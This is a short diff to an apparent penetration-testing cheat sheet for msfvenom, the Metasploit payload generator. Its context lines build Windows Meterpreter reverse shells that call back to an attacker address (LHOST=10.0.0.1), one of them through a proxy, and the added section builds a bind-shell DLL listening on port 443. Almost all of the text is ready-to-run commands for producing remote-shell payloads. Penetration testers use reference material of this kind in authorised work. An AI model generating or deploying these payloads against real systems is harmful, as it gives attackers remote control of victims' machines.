@@ -23,6 +23,11 @@ msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LP
 msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=user HttpProxyPass=password LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o meterpreter.exe
 ```
 
+##### Bind Shell - DLL Payload:
+```
+msfvenom --platform Windows -p windows/shell_bind_tcp LPORT=443 -f DLL -o bind_shell.dll
+```
+
 #### Encoding:
 
 ```
